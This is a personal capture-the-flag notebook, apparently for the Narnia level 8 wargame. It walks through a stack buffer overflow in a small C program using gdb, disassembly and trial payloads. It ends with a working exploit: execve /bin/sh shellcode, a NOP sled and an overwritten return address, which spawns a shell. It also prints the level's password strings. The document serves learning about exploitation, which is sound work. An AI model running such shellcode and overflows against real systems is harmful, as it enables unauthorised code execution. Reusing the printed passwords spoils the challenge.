@@ -1,0 +1,339 @@
+Previous key: mohthuphog
+
+/*
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+// gcc's variable reordering fucked things up
+// to keep the level in its old style i am 
+// making "i" global unti i find a fix 
+// -morla 
+int i; 
+
+void func(char *b){
+	char *blah=b;
+	char bok[20];
+	//int i=0;
+	
+	memset(bok, '\0', sizeof(bok));
+	for(i=0; blah[i] != '\0'; i++)
+		bok[i]=blah[i];
+
+	printf("%s\n",bok);
+}
+
+int main(int argc, char **argv){
+        
+	if(argc > 1)       
+		func(argv[1]);
+	else    
+	printf("%s argument\n", argv[0]);
+
+	return 0;
+}
+
+I guess that i placement is a nice hint.
+
+Well that hints I'm gonna need to overwrite i in some way probably.
+
+Okay, so I suppose the idea is I put a lot of characters in argv[1] but where is that going to be anyway let me look at that.
+
+So argv[1] got placed in 0xffffd8fb which is essentially on the stack.
+
+One big note to make I suppose is that it places these so long as the character it's taking from is not 0x0.
+
+However, I do notice at the end of the buffer the following double-word exists: 0xffff4141 at 0xffffd31c
+
+This indicates that I might be partially overwriting a variable.
+
+I'll make another breakpoint immediately after the memset.
+
+Following memset:
+(gdb) x/100wx $esp
+0xffffd2f0:	0xffffd308	0x00000000	0x00000014	0xf7fcdff4
+0xffffd300:	0x080484b0	0x08049794	0x00000000	0x00000000
+0xffffd310:	0x00000000	0x00000000	0x00000000	0xffffd51b
+
+And following the write:
+(gdb) x/100wx $esp
+0xffffd2f0:	0xffffd308	0x00000000	0x00000014	0xf7fcdff4
+0xffffd300:	0x080484b0	0x08049794	0x41414141	0x41414141
+0xffffd310:	0x41414141	0x41414141	0x41414141	0xffff4141
+
+Not sure why that last one there is allowing the bytes to be overwritten but it might be enough for me to do something
+
+Worth noting is that 0xffffd31c is at ebp-0xc which means this is a local variable.
+
+Okay, so blah starts at 0xffffd51b and bok starts at 0xffffd308
+
+When I overwrite the last byte maybe I can do it with something that allows more stack overwriting.
+
+run `python -c "print 'A'*20 + ..."`
+
+Whoops, spent too much time away and I'm not sure what to do with this now. Spent too much time away. I'm going to try and figure out the stack from the assembly.
+
+   0x080483f4 <+0>:	push   ebp
+   0x080483f5 <+1>:	mov    ebp,esp
+   0x080483f7 <+3>:	sub    esp,0x38
+   0x080483fa <+6>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x080483fd <+9>:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048400 <+12>:	mov    DWORD PTR [esp+0x8],0x14
+   0x08048408 <+20>:	mov    DWORD PTR [esp+0x4],0x0
+   0x08048410 <+28>:	lea    eax,[ebp-0x20]
+   0x08048413 <+31>:	mov    DWORD PTR [esp],eax
+   0x08048416 <+34>:	call   0x8048330 <memset@plt>
+   0x0804841b <+39>:	mov    DWORD PTR ds:0x80497c0,0x0
+   0x08048425 <+49>:	jmp    0x8048449 <func+85>
+   0x08048427 <+51>:	mov    eax,ds:0x80497c0
+   0x0804842c <+56>:	mov    edx,DWORD PTR ds:0x80497c0
+   0x08048432 <+62>:	add    edx,DWORD PTR [ebp-0xc]
+   0x08048435 <+65>:	movzx  edx,BYTE PTR [edx]
+   0x08048438 <+68>:	mov    BYTE PTR [ebp+eax*1-0x20],dl
+   0x0804843c <+72>:	mov    eax,ds:0x80497c0
+   0x08048441 <+77>:	add    eax,0x1
+   0x08048444 <+80>:	mov    ds:0x80497c0,eax
+   0x08048449 <+85>:	mov    eax,ds:0x80497c0
+   0x0804844e <+90>:	add    eax,DWORD PTR [ebp-0xc]
+   0x08048451 <+93>:	movzx  eax,BYTE PTR [eax]
+   0x08048454 <+96>:	test   al,al
+   0x08048456 <+98>:	jne    0x8048427 <func+51>
+   0x08048458 <+100>:	mov    eax,0x8048580
+   0x0804845d <+105>:	lea    edx,[ebp-0x20]
+   0x08048460 <+108>:	mov    DWORD PTR [esp+0x4],edx
+   0x08048464 <+112>:	mov    DWORD PTR [esp],eax
+   0x08048467 <+115>:	call   0x8048300 <printf@plt>
+   0x0804846c <+120>:	leave  
+   0x0804846d <+121>:	ret    
+
+___	ebp 				    	0xffffd6f8
+|	ebp-0x4		local 1? 	0xffffd6f4
+|	ebp-0x8		local 2? 	0xffffd6f0
+|	ebp-0xc		buffer 		0xffffd6ec
+|	... 		  (x20)
+|	esp+
+|__ esp			0xffffd6c0
+
+Actually, wait, nah. I'm going to try and get some better debug assistance by recompiling it locally.
+
+Copied the source into a local directory and now I can make a gdb init file and everything why didn't I do this sooner
+
+gcc -m32 -g -fno-stack-protector -o narnia8 narnia8.c
+
+rstevoa@rstevoa-laptop:~/Documents/hacking$ ./narnia8 arstaroeinstoarsntoiar
+Segmentation fault (core dumped)
+rstevoa@rstevoa-laptop:~/Documents/hacking$ ./narnia8 arstaroeinstoarsntoiararsoitnarst
+arstaroeinstoarsntoiar��
+rstevoa@rstevoa-laptop:~/Documents/hacking$ ./narnia8 arstaroeinstoarsntoiararsoitnarstarosietnaorisnt
+Segmentation fault (core dumped)
+rstevoa@rstevoa-laptop:~/Documents/hacking$ ./narnia8 arstaroeinstoarsntoiararsoitnarstarosietnaorisntarsiotnarosteanrs
+arstaroeinstoarsntoian��
+rstevoa@rstevoa-laptop:~/Documents/hacking$ ./narnia8 arstaroeinstoarsntoiararsoitnarstarosietnaorisntarsiotnarosteanrsarsoitnarosietn
+arstaroeinstoarsntoiae��
+rstevoa@rstevoa-laptop:~/Documents/hacking$ ./narnia8 arstaroeinstoarsntoiararsoitnarstarosietnaorisntarsiotnarosteanrsarsotnarsoietnarositnaoirsetn
+Segmentation fault (core dumped)
+
+Uh, that's weird. Didn't notice that happening in any of the remote sessions
+
+narnia8@melinda:~$ /narnia/narnia8 arstaroeinstoarsntoiar
+arstaroeinstoarsntoiaR������F���8��������
+
+Well damn. Some compile flags are wrong. README.txt on melinda/ gave me some hints though
+
+gcc -m32 -g -fno-stack-protector -Wl,-z,norelro -o narnia8 narnia8.c
+
+rstevoa@rstevoa-laptop:~/Documents/hacking$ ./narnia8 arstaroeinstoarsntoiar
+arstaroeinstoarsntoia���
+
+Woo!
+
+Stack protector was detecting the buffer overflow and killing the program before, so I knew what that did. -Wl,-z,norelro is protection from the kind of stuff I did in Narnia 6 and has to do with LDflags, whatever those are. All I can figure out is that they made segmentation faults happen.
+
+In local gdbinit:
+
+b *func+39
+b *func+100
+
+This is so much better now if I can just try to have gdb tell me which variables go to which addresses I'd be sooo happy
+
+(gdb) print &blah
+$1 = (char **) 0xffffcf7c
+(gdb) print &bok
+$2 = (char (*)[20]) 0xffffcf68
+(gdb) print i
+$3 = 0
+(gdb) print &i
+$4 = (int *) 0x80497e8 <i>
+(gdb) step
+
+I found out that the program isn't running the same way (disassembly was different) so I copied the source to /tmp/rstevoa2 on the server because maybe it was that I was compiling on a different computer?
+
+Things to run at startup:
+
+set disassembly-flavor intel
+b *func+39
+b *func+100
+run `python -c "print 'A'*20 + '\x30\x30'"`
+layout split
+
+Man, that one doesn't compile the same either. Oh well, back to regular debugging.
+
+set disassembly-flavor intel
+b *func+39
+b *func+100
+awatch *0xffffd6ec
+disable 3
+run `python -c "print 'A'*20 + '\x30\x30\x30\x30'"`
+
+I use this stuff by getting to the first breakpoint and re-enabling the watchpoint. It triggers after these instructions:
+
+   0x08048449 <+85>:  mov    eax,ds:0x80497c0
+   0x0804844e <+90>:  add    eax,DWORD PTR [ebp-0xc]
+
+This is loop control stuff. At first, 0x80497c0 contains -1 which gets incremented as the loop begins to 0.
+
+After that, the important instructions are:
+
+   0x08048427 <+51>:  mov    eax,ds:0x80497c0
+   0x0804842c <+56>:  mov    edx,DWORD PTR ds:0x80497c0
+   0x08048432 <+62>:  add    edx,DWORD PTR [ebp-0xc]
+   0x08048435 <+65>:  movzx  edx,BYTE PTR [edx]
+   0x08048438 <+68>:  mov    BYTE PTR [ebp+eax*1-0x20],dl
+
+Side note: Know what could be neat? A gdb script to go through normal execution and write instructions to a file in the order they occur, replacing repeated groups with ...\n.
+
+So what's happening here? dl is part of edx so:
+
+eax <- i
+edx <- i
+edx <- edx + blah
+edx <- [edx]
+[ebp+eax-0x20] <- edx
+
+Simpler:
+
+[ebp-0x20+i] <- blah[i]
+
+Okay so ebp-0x20 is actually the start of bok and ebp-0xc is a pointer to blah.
+
+So when I start writing at ebp-0x20 and keep going I have started to overwrite the pointer to blah and that's why there always seemed to be a limit on what I copied.
+
+So if I can avoid overwriting those bytes with something else that would be helpful.
+
+The return address is at (gosh why do I always have to look this stuff up) ebp+4, so I need to write 0x24 bytes then the return address.
+
+run `python -c "print '\x90'*20 + '\x91\x91\x91\x91' + '\x92'*12 + '\x93\x93\x93\x93'"`
+
+So 0x90 should fill the buffer, then 0x91 should overwrite the address for blah, then 0x92 should fill the rest of the space, then 0x93 should overwrite the address bytes.
+
+(gdb) x/20wx $esp
+0xffffd6b0: 0xffffd6c8  0x00000000  0x00000014  0xf7fcbff4
+0xffffd6c0: 0x080484b0  0x08049794  0x90909090  0x90909090
+0xffffd6d0: 0x90909090  0x90909090  0x90909090  0xffffd891
+
+Wait, I'm going to want to preserve that pointer to blah, duh.
+
+run `python -c "print '\x90'*20 + '\xdd\xd8\xff\xff' + '\x92'*12 + '\x93\x93\x93\x93'"`
+
+(gdb) x/20wx $esp
+0xffffd6b0: 0xffffd6c8  0x00000000  0x00000014  0xf7fcbff4
+0xffffd6c0: 0x080484b0  0x08049794  0x90909090  0x90909090
+0xffffd6d0: 0x90909090  0x90909090  0x90909090  0xffffd8dd
+0xffffd6e0: 0x92929292  0x92929292  0x92929292  0x93939393
+0xffffd6f0: 0xffffd8dd  0x00000000  0x080484b9  0xf7fcbff4
+
+TOOK ME LONG ENOUGH GOSH.
+
+So now I need to fit some shellcode there. I'm just going to go ahead and throw it in AFTER the return address.
+
+Taking this from narnia4: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+run `python -c "print '\x90'*20 + '\xc1\xd8\xff\xff' + '\x92'*12 + '\xd0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+
+Starting program: /games/narnia/narnia8 `python -c "print '\x90'*20 + '\xc1\xd8\xff\xff' + '\x92'*12 + '\xd0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+
+Breakpoint 1, 0x0804841b in func ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048458 in func ()
+(gdb) c
+Continuing.
+����������������������������������������1�Ph//shh/bin�����°
+                                                           1�@̀���
+process 1310 is executing new program: /proc/1310/exe
+/proc/1310/exe: Permission denied.
+
+I think that worked. Time to try it for real.
+
+./narnia8 `python -c "print '\x90'*20 + '\xc1\xd8\xff\xff' + '\x92'*12 + '\xd0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+
+When running it in actuality it didn't work correctly (I assume because the addresses are incorrect now) but it seems to dump part of the stack into stdout so I put that into /tmp/rstevoa2/log and checked the hex.
+
+narnia8@melinda:/narnia$ hexdump -C /tmp/rstevoa2/log
+00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+00000010  90 90 90 90 c1 90 ff ff  ff ff ff ff 46 b1 e5 f7  |............F...|
+00000020  08 d7 ff ff 8d 84 04 08  d0 d8 ff ff 0a           |.............|
+0000002d
+
+If I compare to the gdb dump earlier:
+
+(gdb) x/20wx $esp
+0xffffd6b0: 0xffffd6c8  0x00000000  0x00000014  0xf7fcbff4
+0xffffd6c0: 0x080484b0  0x08049794  0x90909090  0x90909090
+0xffffd6d0: 0x90909090  0x90909090  0x90909090  0xffffd8dd
+0xffffd6e0: 0x92929292  0x92929292  0x92929292  0x93939393
+0xffffd6f0: 0xffffd8dd  0x00000000  0x080484b9  0xf7fcbff4
+
+Then 16 bytes after the overwritten address to blah there should be another copy of it.
+
+The 0x90s end after a little while and then there's an 0xc1 and an 0x90 so that marks the start of the overwritten address to blah.
+
+16 bytes after that there's an 0xffffd8d0 which should be the correct address. That means the current updated run code should be:
+
+./narnia8 `python -c "print '\x90'*20 + '\xd0\xd8\xff\xff' + '\x92'*12 + '\xd0\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+
+Now of course the return address is probably off too, but I imagine it's going to be off by the same amount. 0xc1 needed to be updated to d0, which means increased by 0xf. I'll do the same to the return address.
+
+./narnia8 `python -c "print '\x90'*20 + '\xd0\xd8\xff\xff' + '\x92'*12 + '\xdf\xd6\xff\xff' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+
+Hm, that's not working. Let me just give myself some extra space by adding a nop sled.
+
+./narnia8 `python -c "print '\x90'*20 + '\xd0\xd8\xff\xff' + '\x92'*12 + '\xdf\xd6\xff\xff' + '\x90'*80 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"` > /tmp/rstevoa2/log
+
+Check the log again, figure out the correct address to blah...
+
+./narnia8 `python -c "print '\x90'*20 + '\x80\xd8\xff\xff' + '\x92'*12 + '\x9f\xd6\xff\xff' + '\x90'*80 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+
+I just played with that last byte of the return address at this point. This is what worked:
+
+narnia8@melinda:/narnia$ ./narnia8 `python -c "print '\x90'*20 + '\x80\xd8\xff\xff' + '\x92'*12 + '\xa0\xd6\xff\xff' + '\x90'*80 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
+������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin�����°
+                                                                                                                                           1�@̀@�
+$
+
+eiL5fealae
+
+Notes:
+-I really think making that script to just log all the instructions in order / omitting repetitions would probably help with future challenges. I don't like staring at a block of assembly and trying to keep track of the flow mentally. That's pretty much what I was trying to get out of by getting source to show up.
+
+-What was that `int i;` placement doing to screw up the challenge?
+
+-What flags did they use to compile this? Is there a good way to figure that out without being told?
+
+-When I do these I need to stop trying to do them one piece at a time because I end up losing my train of thought and I need to figure things out again.
+
+-What are LDflags?
